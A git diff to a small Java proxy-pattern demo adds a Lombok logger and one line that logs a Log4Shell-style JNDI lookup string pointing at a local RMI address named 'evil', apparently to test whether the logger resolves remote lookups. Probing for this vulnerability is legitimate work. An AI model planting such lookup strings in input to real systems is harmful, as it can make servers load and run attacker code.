@@ -2,14 +2,18 @@ package com.yangxvhao.demo;
 
 import java.lang.reflect.Proxy;
 
+import lombok.extern.java.Log;
+
 /**
  * @author yangxvhao
  * @date 2018-11-02 下午4:44.
  */
+@Log
 public class Main {
     private static final int _1MB = 1024*1024;
     
     public static void main(String[] args) {
+        log.info("${jndi:rmi://127.0.0.1:1100/evil}");
         //静态代理
         ProxyHello proxyHello = new ProxyHello(new HelloImpl("tom"));
         proxyHello.show("how are you!");
